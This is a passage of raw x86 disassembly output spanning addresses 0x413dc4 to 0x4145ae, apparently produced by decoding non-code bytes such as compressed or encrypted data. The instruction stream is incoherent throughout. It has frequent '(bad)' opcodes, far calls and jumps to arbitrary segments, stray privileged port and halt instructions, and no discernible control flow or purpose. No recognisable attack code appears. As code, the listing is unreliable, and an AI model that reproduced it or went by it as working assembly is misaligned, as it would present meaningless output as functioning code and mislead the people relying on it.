  413dc4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413dc5:	call   0xe4f1:0x7bfd5b29
  413dcc:	fimul  DWORD PTR [edi-0x2c5f795d]
  413dd2:	push   ebp
  413dd3:	adc    DWORD PTR [edx],esi
  413dd5:	sti    
  413dd6:	jg     0x413e2a
  413dd8:	idiv   DWORD PTR [eax+edi*8]
  413ddb:	enter  0x5e72,0xd4
  413ddf:	jmp    0x8889fbc2
  413de4:	push   eax
  413de5:	test   eax,0xaa4fad4
  413dea:	mov    ebp,0xb415577
  413def:	nop
  413df0:	dec    edi
  413df1:	jae    0x413dbe
  413df3:	xchg   esp,eax
  413df4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413df5:	or     DWORD PTR [edi+edx*4],ecx
  413df8:	sub    eax,0xd2373288
  413dfd:	sub    DWORD PTR [edx+0x79dd59e2],ebx
  413e03:	pop    esp
  413e04:	hlt    
  413e05:	mov    esi,0x317504bc
  413e0a:	jecxz  0x413daf
  413e0c:	dec    esi
  413e0d:	cwde   
  413e0e:	and    dh,BYTE PTR [esi+0x15]
  413e11:	mov    ebp,0x1250cf46
  413e16:	call   0x3bfb:0xde02f384
  413e1d:	lahf   
  413e1e:	sub    DWORD PTR [esi-0x749bd8b3],edx
  413e24:	inc    edi
  413e25:	jmp    0x599a218d
  413e2a:	pop    ecx
  413e2b:	adc    BYTE PTR [ecx+0x65be3e67],bh
  413e31:	sbb    ebx,esp
  413e33:	inc    eax
  413e34:	lods   al,BYTE PTR ds:[esi]
  413e35:	adc    al,0x58
  413e37:	or     al,0xc1
  413e39:	xor    DWORD PTR [ebp+0x28dada95],ecx
  413e3f:	repnz and al,0x82
  413e42:	mov    ebx,0xdfbb8dc6
  413e47:	loopne 0x413e17
  413e49:	(bad)  [ebx-0x236084cf]
  413e4f:	mov    BYTE PTR [ebp+0x77fbac2e],bl
  413e55:	xchg   esp,eax
  413e56:	cmp    BYTE PTR [edi],cl
  413e58:	call   0x6754:0x3df2c26e
  413e5f:	dec    esp
  413e60:	and    BYTE PTR [ebx+0x74],bl
  413e63:	pop    eax
  413e64:	leave  
  413e65:	retf   0x128c
  413e68:	sti    
  413e69:	fwait
  413e6a:	jns    0x413ee6
  413e6c:	das    
  413e6d:	out    dx,eax
  413e6e:	push   esi
  413e6f:	repz fcmove st,st(5)
  413e72:	push   es
  413e73:	inc    ecx
  413e74:	push   cs
  413e75:	jo     0x413e06
  413e77:	jbe    0x413e40
  413e79:	das    
  413e7a:	in     al,dx
  413e7b:	xchg   esi,eax
  413e7c:	fsubp  st(3),st
  413e7e:	add    BYTE PTR [ecx+ebx*8-0x4b],0x1e
  413e83:	fadd   st(4),st
  413e85:	scas   eax,DWORD PTR es:[edi]
  413e86:	sub    BYTE PTR [eax-0x6a],dl
  413e89:	out    dx,al
  413e8a:	lock push ebx
  413e8c:	rcr    BYTE PTR [esi-0x1d396421],0xe6
  413e93:	sar    BYTE PTR [ebx+0x65ce10d2],1
  413e99:	push   es
  413e9a:	xor    eax,0x44029d15
  413e9f:	fwait
  413ea0:	adc    eax,0x2c7f63d1
  413ea5:	xchg   esi,eax
  413ea6:	pop    eax
  413ea7:	push   0x43
  413ea9:	pop    ebp
  413eaa:	sbb    edi,ebp
  413eac:	cmp    eax,0xe0ea48e5
  413eb1:	xchg   ebp,eax
  413eb2:	sbb    al,0xdb
  413eb4:	nop
  413eb5:	and    DWORD PTR [edi-0x19f651b2],edx
  413ebb:	fs push ebp
  413ebd:	aad    0x73
  413ebf:	pop    edx
  413ec0:	push   edx
  413ec1:	fnstenv [eax-0x5aa5ebd4]
  413ec7:	add    DWORD PTR [ebx+0x50],edi
  413eca:	leave  
  413ecb:	jnp    0x413f0b
  413ecd:	sbb    eax,0x5e507ac8
  413ed2:	mov    ecx,0xa2f2d908
  413ed7:	outs   dx,BYTE PTR ds:[esi]
  413ed8:	and    eax,0xc60ec367
  413edd:	imul   ebp,DWORD PTR [ecx-0x35aa093a],0xcab2da06
  413ee7:	or     eax,0x7f5ee49
  413eec:	pusha  
  413eed:	js     0x413ee9
  413eef:	(bad)  
  413ef0:	jmp    0xffb0:0x176d0d3e
  413ef7:	pop    ecx
  413ef8:	fwait
  413ef9:	jecxz  0x413ed1
  413efb:	push   ebp
  413efc:	ret    
  413efd:	jo     0x413e82
  413eff:	dec    eax
  413f00:	or     al,0x35
  413f02:	pop    ebp
  413f03:	xchg   esp,eax
  413f04:	fistp  QWORD PTR [esi+0x79692bca]
  413f0a:	adc    DWORD PTR [ebx],ebp
  413f0c:	adc    bh,bh
  413f0e:	(bad)  
  413f0f:	fsubp  st(3),st
  413f11:	push   ecx
  413f12:	pop    ss
  413f13:	add    al,0xd0
  413f15:	dec    bx
  413f17:	mov    eax,0xaa3f9b66
  413f1c:	leave  
  413f1d:	sub    eax,DWORD PTR [ecx+eiz*1+0x51]
  413f21:	or     eax,0x345e2624
  413f26:	jmp    0xdd9c48e6
  413f2b:	or     edi,eax
  413f2d:	adc    DWORD PTR [edx+0x1a],ecx
  413f30:	addr16 jmp 0x413f37
  413f33:	xchg   ecx,eax
  413f34:	sbb    ebx,edi
  413f36:	adc    eax,0x13bad2c7
  413f3b:	(bad)  
  413f3c:	push   esi
  413f3d:	in     eax,dx
  413f3e:	inc    edx
  413f3f:	gs pop ebp
  413f41:	gs ds inc esi
  413f44:	push   0xffffffe3
  413f46:	int    0x8b
  413f48:	popa   
  413f49:	xor    dh,cl
  413f4b:	stos   DWORD PTR es:[edi],eax
  413f4c:	mov    dh,BYTE PTR ds:0x2352d464
  413f52:	adc    ch,al
  413f54:	retf   0xb165
  413f57:	in     al,0x3b
  413f59:	ss in  al,0xa9
  413f5c:	sub    al,0xdc
  413f5e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413f5f:	mov    dl,0xe2
  413f61:	or     DWORD PTR [ecx],edx
  413f63:	ss dec esp
  413f65:	pop    ebp
  413f66:	xchg   ebp,eax
  413f67:	pushf  
  413f68:	mov    cl,0x49
  413f6a:	pusha  
  413f6b:	icebp  
  413f6c:	cmp    BYTE PTR [esi+0x399f7b06],al
  413f72:	sbb    DWORD PTR [esi+0x63],ecx
  413f75:	or     al,0x23
  413f77:	out    dx,al
  413f78:	repnz xchg ebx,eax
  413f7a:	inc    esi
  413f7b:	fld    TBYTE PTR [edi+0x70b5854]
  413f81:	int3   
  413f82:	iret   
  413f83:	add    ch,BYTE PTR [eax]
  413f85:	popa   
  413f86:	xchg   BYTE PTR [ecx+0x23],ch
  413f89:	push   edx
  413f8a:	inc    edx
  413f8b:	mov    al,0xba
  413f8d:	ins    DWORD PTR es:[edi],dx
  413f8e:	add    ebx,DWORD PTR [esi]
  413f90:	scas   eax,DWORD PTR es:[edi]
  413f91:	jl     0x413f3f
  413f93:	ja     0x413f53
  413f95:	in     eax,dx
  413f96:	mov    edx,0xc81f403e
  413f9b:	mov    cl,0xe8
  413f9d:	jo     0x413f56
  413f9f:	ss jg  0x41401a
  413fa2:	aam    0x6c
  413fa4:	mov    cl,0xf3
  413fa6:	push   esp
  413fa7:	out    0x92,al
  413fa9:	push   ebp
  413faa:	mov    bl,ch
  413fac:	imul   DWORD PTR [edx]
  413fae:	cmp    ecx,0x7c84391e
  413fb4:	jmp    0x413fef
  413fb6:	out    0xaa,eax
  413fb8:	dec    ebp
  413fb9:	fidivr WORD PTR [ebp+eiz*1-0x3146aba2]
  413fc0:	inc    ecx
  413fc1:	inc    edx
  413fc2:	xor    DWORD PTR cs:[ecx+edi*1+0x3f],ebx
  413fc7:	ins    DWORD PTR es:[edi],dx
  413fc8:	mov    ?,WORD PTR ds:0xd134ebbf
  413fce:	cmovb  esi,DWORD PTR [esi-0x66]
  413fd2:	push   ecx
  413fd3:	jae    0x413fde
  413fd5:	scas   al,BYTE PTR es:[edi]
  413fd6:	jne    0x413f82
  413fd8:	xor    al,0x1e
  413fda:	out    dx,eax
  413fdb:	(bad)  
  413fdc:	std    
  413fdd:	enter  0x7d40,0x75
  413fe1:	sub    BYTE PTR [ecx],bl
  413fe3:	adc    al,0xfa
  413fe5:	or     eax,0x7e6f05be
  413fea:	mov    esp,0xd04daa2a
  413fef:	fisub  WORD PTR [edi+0x778da85e]
  413ff5:	inc    esi
  413ff6:	lock mov ds:0xd517ac91,al
  413ffc:	pusha  
  413ffd:	dec    esp
  413ffe:	sub    BYTE PTR [esi-0x10097734],al
  414004:	sub    eax,0x648421ad
  414009:	sub    ebp,eax
  41400b:	push   ss
  41400c:	fisub  WORD PTR [ecx]
  41400e:	push   0x9c1ba90b
  414013:	shl    ebx,0xe7
  414016:	(bad)  
  414017:	test   BYTE PTR [edi],0x1a
  41401a:	sti    
  41401b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41401c:	pusha  
  41401d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41401e:	adc    DWORD PTR ss:[eax],0xe08f8822
  414025:	push   bx
  414027:	rcr    DWORD PTR [ebx+0x281660ee],cl
  41402d:	and    eax,0x85c16811
  414032:	out    dx,eax
  414033:	fdiv   DWORD PTR [ebp-0x7ac30c2f]
  414039:	fsubrp st(3),st
  41403b:	xchg   DWORD PTR [edx-0x3e],edx
  41403e:	lock pop es
  414040:	stc    
  414041:	sbb    DWORD PTR [edi-0x9261aaa],ebx
  414047:	pop    edx
  414048:	dec    ebx
  414049:	popa   
  41404a:	push   cs
  41404b:	inc    ebp
  41404c:	pushf  
  41404d:	adc    bh,BYTE PTR [eax-0x7b017705]
  414053:	add    ah,dl
  414055:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414056:	fsubp  st(5),st
  414058:	les    esp,FWORD PTR [edi-0x54]
  41405b:	jno    0x4140a1
  41405d:	adc    dl,BYTE PTR [eax]
  41405f:	clc    
  414060:	out    dx,al
  414061:	cli    
  414062:	jmp    0x4140ce
  414064:	mov    DWORD PTR [ebx+ecx*2],esp
  414067:	inc    esp
  414068:	sbb    edx,edx
  41406a:	mov    eax,DWORD PTR [esi]
  41406c:	js     0x414040
  41406e:	add    eax,0x8bae7873
  414073:	adc    dl,0x73
  414076:	fisub  WORD PTR [esi-0x3c7bbbb]
  41407c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41407d:	(bad)  
  41407e:	int    0x43
  414080:	push   ebx
  414081:	ins    DWORD PTR es:[edi],dx
  414082:	push   0xffffff84
  414084:	cmc    
  414085:	sbb    BYTE PTR [ecx+eiz*1],bh
  414088:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414089:	cmp    esi,edi
  41408b:	push   ebx
  41408c:	sub    al,0xd6
  41408e:	xor    DWORD PTR [ecx],edx
  414090:	mov    eax,0x55bc4f52
  414095:	sub    eax,0xbe4ea799
  41409a:	inc    ebp
  41409b:	adc    DWORD PTR [ecx+ebx*8+0x296ec470],0xa24f1fef
  4140a6:	sbb    edi,0xecd3492e
  4140ac:	lahf   
  4140ad:	shl    BYTE PTR [esp+edi*8-0x2b86e48f],0xf6
  4140b5:	jg     0x414069
  4140b7:	sub    al,0x49
  4140b9:	sar    BYTE PTR [edx+eiz*8+0x1647f61],1
  4140c0:	(bad)  
  4140c1:	in     al,0xb0
  4140c3:	cmp    eax,0xa051b84e
  4140c8:	xchg   BYTE PTR [eax+ecx*1+0x56ae8cbc],ch
  4140cf:	je     0x4140e5
  4140d1:	dec    ebx
  4140d2:	(bad)  
  4140d3:	cmp    ah,dl
  4140d5:	daa    
  4140d6:	lods   eax,DWORD PTR ds:[esi]
  4140d7:	lds    edi,FWORD PTR [ebp-0x62]
  4140da:	inc    esi
  4140db:	jecxz  0x414106
  4140dd:	jb     0x4140bc
  4140df:	mov    dl,0x9e
  4140e1:	xchg   bl,bh
  4140e3:	sub    dh,BYTE PTR [ebp-0x3327b703]
  4140e9:	cs jecxz 0x414148
  4140ec:	daa    
  4140ed:	cmp    al,0xb3
  4140ef:	adc    dh,BYTE PTR [ebp-0xa]
  4140f2:	xor    eax,0x4ca8bd84
  4140f7:	or     DWORD PTR [edi+0x140fb56b],edi
  4140fd:	cmp    edx,DWORD PTR [esi+0x6]
  414100:	xchg   edx,ecx
  414102:	adc    al,0x73
  414104:	and    al,0xf0
  414106:	cmp    esp,ebx
  414108:	loopne 0x4140df
  41410a:	push   0x6
  41410c:	inc    ebp
  41410d:	or     ebp,ebx
  41410f:	mov    ecx,0xd561a1a6
  414114:	in     al,0x67
  414116:	out    dx,al
  414117:	add    edx,DWORD PTR [eax-0x20]
  41411a:	mov    ecx,0xd4500778
  41411f:	loopne 0x41414c
  414121:	sbb    BYTE PTR [edi-0x34],ah
  414124:	stos   BYTE PTR es:[edi],al
  414125:	or     BYTE PTR [edx+0x43dad4c0],0xa4
  41412c:	bound  edi,QWORD PTR [ebx+0x38a91cd8]
  414132:	icebp  
  414133:	or     esp,edx
  414135:	xchg   edx,eax
  414136:	std    
  414137:	hlt    
  414138:	xor    al,0x9
  41413a:	inc    edi
  41413b:	mov    WORD PTR [esi+0x3e],gs
  41413e:	xor    BYTE PTR [edx-0x710d723d],0xb7
  414145:	jp     0x414164
  414147:	add    dl,bh
  414149:	xchg   ecx,eax
  41414a:	fimul  DWORD PTR [ecx-0x67e810f5]
  414150:	pop    esi
  414151:	push   0x7e
  414153:	out    dx,eax
  414154:	mov    edx,0x4824e149
  414159:	sti    
  41415a:	aam    0x82
  41415c:	jb     0x4141a3
  41415e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41415f:	pop    esp
  414160:	shr    BYTE PTR [ebp+0xedb23a2],1
  414166:	dec    eax
  414167:	push   eax
  414168:	push   es
  414169:	jmp    0x4022e31d
  41416e:	adc    al,0x3
  414170:	ret    
  414171:	dec    esi
  414172:	js     0x414199
  414174:	dec    eax
  414175:	adc    eax,0x85d4eea0
  41417a:	jb     0x414115
  41417c:	inc    edx
  41417d:	jmp    0xed9f:0xd0142230
  414184:	int    0xe6
  414186:	fild   WORD PTR ds:0xfec487f7
  41418c:	fs adc eax,0x5fbb5ec2
  414192:	int3   
  414193:	out    0x3a,al
  414195:	outs   dx,BYTE PTR ds:[esi]
  414196:	or     al,0x20
  414198:	(bad)  
  414199:	xor    eax,0xb8baa54b
  41419e:	leave  
  41419f:	es xchg edx,eax
  4141a1:	call   0xda23964
  4141a6:	loop   0x4141f3
  4141a8:	gs mov ch,0x92
  4141ab:	push   ds
  4141ac:	std    
  4141ad:	sbb    BYTE PTR [ebp+0x4f],ch
  4141b0:	popf   
  4141b1:	lods   al,BYTE PTR ds:[esi]
  4141b2:	es fwait
  4141b4:	es push 0x1b
  4141b7:	ret    0x7478
  4141ba:	hlt    
  4141bb:	jle    0x414170
  4141bd:	inc    ecx
  4141be:	jne    0x41419f
  4141c0:	ins    BYTE PTR es:[edi],dx
  4141c1:	fsubr  DWORD PTR [esi]
  4141c3:	add    eax,ecx
  4141c5:	add    eax,0x78edc39b
  4141ca:	rcl    ebx,0x98
  4141cd:	retf   0x2a6a
  4141d0:	xlat   BYTE PTR ds:[ebx]
  4141d1:	cmp    al,0x79
  4141d3:	fst    QWORD PTR [eax]
  4141d5:	test   al,0x7d
  4141d7:	inc    esp
  4141d8:	and    eax,0x8b6a2b9a
  4141dd:	sub    al,dl
  4141df:	dec    ebp
  4141e0:	dec    ebp
  4141e1:	imul   BYTE PTR [eax]
  4141e3:	mov    cl,0x65
  4141e5:	ret    0x10e3
  4141e8:	loope  0x414178
  4141ea:	mov    esp,0x1a4458d7
  4141ef:	add    ah,ah
  4141f1:	xor    dl,ah
  4141f3:	stos   BYTE PTR es:[edi],al
  4141f4:	inc    ecx
  4141f5:	outs   dx,DWORD PTR ds:[esi]
  4141f6:	sub    eax,0x6f160813
  4141fb:	clc    
  4141fc:	xchg   ebx,eax
  4141fd:	nop
  4141fe:	pop    esi
  4141ff:	gs or  eax,0x8a21f224
  414205:	pop    esp
  414206:	jno    0x41423d
  414208:	outs   dx,BYTE PTR es:[esi]
  41420a:	bound  eax,QWORD PTR [eax]
  41420c:	and    BYTE PTR [edi+edx*1],0xa0
  414210:	xchg   esp,eax
  414211:	sub    BYTE PTR [ebp+0x7],bl
  414214:	dec    eax
  414215:	nop
  414216:	mov    eax,ds:0xb3835b8b
  41421b:	adc    dh,cl
  41421d:	mov    edi,DWORD PTR [ecx+0x50]
  414220:	sub    BYTE PTR [eax-0x5f],dl
  414223:	iret   
  414224:	add    al,0x46
  414226:	inc    ebx
  414227:	(bad)  
  414228:	sub    ch,cl
  41422a:	test   BYTE PTR [edi],bl
  41422c:	sub    eax,0x9aec721b
  414231:	js     0x414211
  414233:	retf   0x3dd0
  414236:	and    ebx,DWORD PTR [eax+0x882ef85]
  41423c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41423d:	push   ecx
  41423e:	popf   
  41423f:	es xchg ecx,eax
  414241:	mov    ah,0x39
  414243:	in     eax,0x5f
  414245:	add    DWORD PTR [esi-0x163cdb96],ecx
  41424b:	shl    DWORD PTR [eax+ebp*8+0x5a],0x75
  414250:	addr16 (bad) 
  414252:	imul   edx,DWORD PTR [ebx-0x1416bf01],0x40
  414259:	or     ah,ch
  41425b:	add    BYTE PTR [esi+0x3d655542],cl
  414261:	rcr    eax,1
  414263:	ins    BYTE PTR es:[edi],dx
  414264:	jg     0x414242
  414266:	mov    ecx,DWORD PTR [edx+eax*8-0x1f15eef1]
  41426d:	inc    ebp
  41426e:	xlat   BYTE PTR ds:[ebx]
  41426f:	fs das 
  414271:	inc    eax
  414272:	loope  0x4142ef
  414274:	fwait
  414275:	pop    esi
  414276:	test   cl,dl
  414278:	xchg   esi,eax
  414279:	je     0x41422a
  41427b:	je     0x41429e
  41427d:	or     DWORD PTR [ebx-0xf],esp
  414280:	mov    ?,WORD PTR [eax-0x5ea55ef2]
  414286:	lds    esp,FWORD PTR [ecx+0x64]
  414289:	cmp    al,BYTE PTR [esi+0x67]
  41428c:	xchg   edx,eax
  41428d:	iret   
  41428e:	mov    ebx,0x3904d5e3
  414293:	fdiv   QWORD PTR [esi+0x6518045f]
  414299:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41429a:	(bad)  
  41429b:	xor    DWORD PTR [ebp+0x6fb86a30],edi
  4142a1:	int    0xf0
  4142a3:	jmp    0x17fabfb1
  4142a8:	xor    ebp,DWORD PTR [eax+0x1c]
  4142ab:	inc    ebx
  4142ac:	sub    esp,0x38cfcdbb
  4142b2:	enter  0xbf55,0xbc
  4142b6:	adc    BYTE PTR [esi],0x5f
  4142b9:	or     eax,0xcb21b0ed
  4142be:	add    bl,BYTE PTR [edi]
  4142c0:	mov    eax,ds:0x9a86f4f
  4142c5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4142c6:	test   ah,0xd9
  4142c9:	xchg   BYTE PTR [edx+0x47c5d1d1],bh
  4142cf:	cmc    
  4142d0:	repnz add cl,bh
  4142d3:	in     al,dx
  4142d4:	mov    al,0xc2
  4142d6:	mov    dh,0x2b
  4142d8:	fnstcw WORD PTR [ebx+eax*8+0x0]
  4142dc:	arpl   WORD PTR [ebx+edi*1-0x9d50c9f],bp
  4142e3:	mov    ah,0xc7
  4142e5:	mov    eax,ds:0xc95c03f0
  4142ea:	ds jmp 0xfa39:0x52061332
  4142f2:	dec    ecx
  4142f3:	test   BYTE PTR [edi],ah
  4142f5:	(bad)
  4142f8:	push   es
  4142f9:	lods   al,BYTE PTR ds:[esi]
  4142fa:	cmp    bl,BYTE PTR [esi-0x63]
  4142fd:	mov    eax,ds:0x2052c1d5
  414302:	nop
  414303:	mov    dl,0xae
  414305:	das    
  414306:	(bad)
  41430a:	jne    0x414389
  41430c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41430d:	mov    cl,0x23
  41430f:	cmp    ah,BYTE PTR [edx+0x28]
  414312:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414313:	cmp    al,0x6b
  414315:	and    ah,BYTE PTR [ecx]
  414317:	loop   0x4142b9
  414319:	shr    BYTE PTR [edi],cl
  41431b:	xchg   edi,eax
  41431c:	repz inc ecx
  41431e:	test   al,0x61
  414320:	retf   0x30e2
  414323:	mov    edx,0x7c9cbddb
  414328:	xor    DWORD PTR [eax+esi*4],edi
  41432b:	pop    esi
  41432c:	or     eax,0x565faeef
  414331:	sbb    dh,ch
  414333:	pop    esi
  414334:	mov    BYTE PTR [ebx+0x66fd323a],0x4e
  41433b:	in     al,0x22
  41433d:	and    ebp,DWORD PTR [ecx]
  41433f:	ror    BYTE PTR [eax+0x58a8aa72],1
  414345:	mov    ebp,0xfe1f8a2a
  41434a:	sub    DWORD PTR [ebx-0x7655c09f],0x52
  414351:	pop    esp
  414352:	sub    ah,bh
  414354:	inc    esp
  414355:	xor    edx,ebx
  414357:	in     eax,dx
  414358:	test   BYTE PTR [ecx+0x36527785],ch
  41435e:	(bad)  [esi+0x606bd90a]
  414364:	and    al,0xbb
  414366:	(bad)  
  414367:	adc    DWORD PTR [esi+edi*2],esp
  41436a:	int3   
  41436b:	idiv   DWORD PTR [eax]
  41436d:	sbb    eax,0xb7249957
  414372:	dec    eax
  414373:	jl     0x414376
  414375:	outs   dx,BYTE PTR ds:[esi]
  414376:	fmulp  st(2),st
  414378:	test   al,0xd4
  41437a:	sar    BYTE PTR [edi-0x5bc83978],1
  414380:	and    DWORD PTR [ebp+0x58579ffc],ebp
  414386:	call   0x4cbc:0x97471c0a
  41438d:	fidivr DWORD PTR [eax+0x33]
  414390:	xchg   ecx,eax
  414391:	cmp    DWORD PTR [eax-0xcffba32],edx
  414397:	in     eax,0xc9
  414399:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41439a:	jns    0x4143d0
  41439c:	test   al,0x1a
  41439e:	lea    ebx,[esi-0x22]
  4143a1:	cwde   
  4143a2:	mov    dl,0xd3
  4143a4:	sbb    BYTE PTR [ecx+eax*8+0x16692f6c],bh
  4143ab:	cdq    
  4143ac:	and    bh,BYTE PTR [eax+0x729a8ed2]
  4143b2:	outs   dx,DWORD PTR ds:[esi]
  4143b3:	jp     0x414393
  4143b5:	push   edx
  4143b6:	or     BYTE PTR [esp+eax*8+0x2cc97c89],dl
  4143bd:	call   0xb0a3ec26
  4143c2:	dec    edi
  4143c3:	sbb    al,0x77
  4143c5:	bound  edx,QWORD PTR [ecx+0x4b]
  4143c8:	add    al,0x4e
  4143ca:	lds    eax,FWORD PTR [ecx-0x3d]
  4143cd:	xchg   ecx,eax
  4143ce:	ds popa 
  4143d0:	inc    esi
  4143d1:	push   ds
  4143d2:	(bad)  
  4143d3:	leave  
  4143d4:	rcr    BYTE PTR [esp+eax*1-0x2b],cl
  4143d8:	lahf   
  4143d9:	mov    ecx,0x19fffa97
  4143de:	xchg   esi,eax
  4143df:	push   edx
  4143e0:	sbb    eax,0xe1d99869
  4143e5:	mov    BYTE PTR [ebx+edx*4+0x79d26ce2],dh
  4143ec:	jge    0x41441c
  4143ee:	icebp  
  4143ef:	psrlq  mm7,QWORD PTR [edi-0xf]
  4143f3:	and    BYTE PTR [edx],0x8a
  4143f6:	fwait
  4143f7:	jecxz  0x4143bb
  4143f9:	mov    ?,WORD PTR [ebp-0x33]
  4143fc:	mov    DWORD PTR [edi+0x7b],edx
  4143ff:	rol    DWORD PTR [ebx-0x37],0x4b
  414403:	push   ds
  414404:	mov    dh,0x1e
  414406:	xlat   BYTE PTR ds:[ebx]
  414407:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414408:	mov    eax,ds:0x6b553a7e
  41440d:	or     BYTE PTR [eax],dl
  41440f:	add    bh,BYTE PTR [ebx]
  414411:	neg    DWORD PTR [edx-0xb]
  414414:	fs jmp 0x7887d82c
  41441a:	icebp  
  41441b:	sar    al,1
  41441d:	pop    es
  41441e:	punpckhbw mm3,mm1
  414421:	mov    al,0xe5
  414423:	adc    ecx,DWORD PTR [edx]
  414425:	cli    
  414426:	imul   ebp,DWORD PTR [edi+0x575e0034],0x7200ccce
  414430:	xchg   ecx,eax
  414431:	and    esp,0xffffffd0
  414434:	ins    DWORD PTR es:[edi],dx
  414435:	cmp    DWORD PTR [ebx+edi*1+0x23586042],esi
  41443c:	call   0xef85f148
  414441:	retf   0xca93
  414444:	cwde   
  414445:	fstp   QWORD PTR [ebx-0x4c38ffff]
  41444b:	rcl    BYTE PTR [edx+0x69],0x34
  41444f:	out    0xee,eax
  414451:	mov    ebx,0xcc5a4348
  414456:	repz xchg ebx,eax
  414458:	jns    0x414465
  41445a:	(bad)  
  41445b:	js     0x414471
  41445d:	fidivr WORD PTR [edx]
  41445f:	jge    0x414462
  414461:	push   0xcf02a427
  414466:	aad    0xc4
  414468:	push   ecx
  414469:	push   0xffffffa6
  41446b:	das    
  41446c:	test   dl,bh
  41446e:	mov    al,ds:0x46caeedb
  414473:	cli    
  414474:	aaa    
  414475:	fwait
  414476:	movs   DWORD PTR es:[edi],DWORD PTR ss:[esi]
  414478:	or     DWORD PTR cs:[edi-0x1258bf35],0xffffffe9
  414480:	in     eax,dx
  414481:	push   ebp
  414482:	or     eax,0xa857ac16
  414487:	jae    0x414468
  414489:	mov    DWORD PTR [eax],0x8551bc87
  41448f:	scas   eax,DWORD PTR es:[edi]
  414490:	mov    dh,0x25
  414492:	dec    esp
  414493:	mov    ebp,0xd08d282c
  414498:	add    ebp,ebx
  41449a:	mov    ss,edi
  41449c:	pop    ecx
  41449d:	push   es
  41449e:	stos   BYTE PTR es:[edi],al
  41449f:	in     eax,0xf6
  4144a1:	jo     0x41450c
  4144a3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4144a4:	pop    edx
  4144a5:	push   ebp
  4144a6:	arpl   WORD PTR [edx-0x5a44b858],di
  4144ac:	loope  0x41450f
  4144ae:	push   ds
  4144af:	mov    ebx,0xd8d2fe72
  4144b4:	jbe    0x414522
  4144b6:	ret    0xde39
  4144b9:	mov    edx,DWORD PTR [ecx]
  4144bb:	xor    BYTE PTR [edx-0x50afdce7],bl
  4144c1:	xlat   BYTE PTR ds:[ebx]
  4144c2:	jne    0x414472
  4144c4:	lock aas 
  4144c6:	out    dx,eax
  4144c7:	or     DWORD PTR [edx],edx
  4144c9:	js     0x414477
  4144cb:	(bad)  
  4144cc:	push   ss
  4144cd:	mov    esi,0x1245ea02
  4144d2:	not    al
  4144d4:	mov    esi,0xdd7f6791
  4144d9:	jne    0x41448c
  4144db:	std    
  4144dc:	in     eax,0xfb
  4144de:	stos   BYTE PTR es:[edi],al
  4144df:	push   es
  4144e0:	fldenv [edi]
  4144e2:	fwait
  4144e3:	push   ds
  4144e4:	fld    QWORD PTR [edx]
  4144e6:	mov    cl,0x8c
  4144e8:	add    al,0x6f
  4144ea:	adc    BYTE PTR [ebp+esi*2+0x6021e9f5],al
  4144f1:	mov    al,ds:0xcab842ae
  4144f6:	leave  
  4144f7:	fwait
  4144f8:	or     BYTE PTR [edx],al
  4144fa:	dec    ebx
  4144fb:	mov    ebp,0xb4e988ec
  414500:	lock push es
  414502:	icebp  
  414503:	inc    ebp
  414504:	sub    edi,esi
  414506:	sub    eax,0xdfd173ad
  41450b:	or     esi,DWORD PTR [edi+0x1bce4843]
  414511:	inc    esi
  414512:	or     DWORD PTR [edi],edx
  414514:	jo     0x4144b1
  414516:	bound  eax,QWORD PTR [esi-0x692620bb]
  41451c:	xor    ebp,0xffffffa3
  41451f:	xlat   BYTE PTR ds:[ebx]
  414520:	inc    DWORD PTR [ebx]
  414522:	jg     0x41455a
  414524:	dec    edx
  414525:	jmp    0x3fc8934a
  41452a:	xor    esi,DWORD PTR [esi-0x8]
  41452d:	test   bl,0xf2
  414530:	jp     0x4144b5
  414532:	inc    edx
  414533:	jb     0x41455f
  414535:	pop    eax
  414536:	lahf   
  414537:	mov    esp,0x6cd533b9
  41453c:	adc    al,0xa5
  41453e:	xchg   ebx,eax
  41453f:	push   ss
  414540:	push   0x44
  414542:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414543:	push   0xee719e89
  414548:	fmul   QWORD PTR [edx+0x599f5a41]
  41454e:	xchg   edi,eax
  41454f:	adc    al,0x5e
  414551:	arpl   WORD PTR [edx+0x2a],dx
  414554:	loop   0x414546
  414556:	cmp    esi,DWORD PTR [esi+0x14]
  414559:	add    DWORD PTR [ebx],ebx
  41455b:	pop    edi
  41455c:	jg     0x414576
  41455e:	ret    
  41455f:	test   DWORD PTR [ecx-0x10],esi
  414562:	rcl    DWORD PTR [bx-0x2d],cl
  414566:	jp     0x414521
  414568:	mov    bl,0x7
  41456a:	shl    DWORD PTR [ebp+0x11],1
  41456d:	sti    
  41456e:	inc    edi
  41456f:	leave  
  414570:	add    edi,edx
  414572:	inc    esi
  414573:	sub    eax,0xd93569cf
  414578:	(bad)
  41457b:	fldenv [edx]
  41457d:	lods   al,BYTE PTR ds:[esi]
  41457e:	push   esp
  41457f:	dec    ecx
  414580:	mov    dh,0xef
  414582:	xchg   ecx,eax
  414583:	xchg   ebx,eax
  414584:	push   ecx
  414585:	push   es
  414586:	xchg   ebx,eax
  414587:	mov    al,ds:0xe09d66a7
  41458c:	aad    0xce
  41458e:	xchg   edi,eax
  41458f:	mov    gs,WORD PTR [eax-0x35]
  414592:	xor    eax,0xc969d6bf
  414597:	iret   
  414598:	or     ebp,edx
  41459a:	sub    dl,ah
  41459c:	je     0x414588
  41459e:	add    ah,cl
  4145a0:	fstp   DWORD PTR [eax+0x7e]
  4145a3:	not    BYTE PTR [eax-0x13]
  4145a6:	in     eax,dx
  4145a7:	mov    ecx,0xaecbda87
  4145ac:	jge    0x4145b0
  4145ae:	mov    DWORD PTR [eax+0x4a241b05],edx
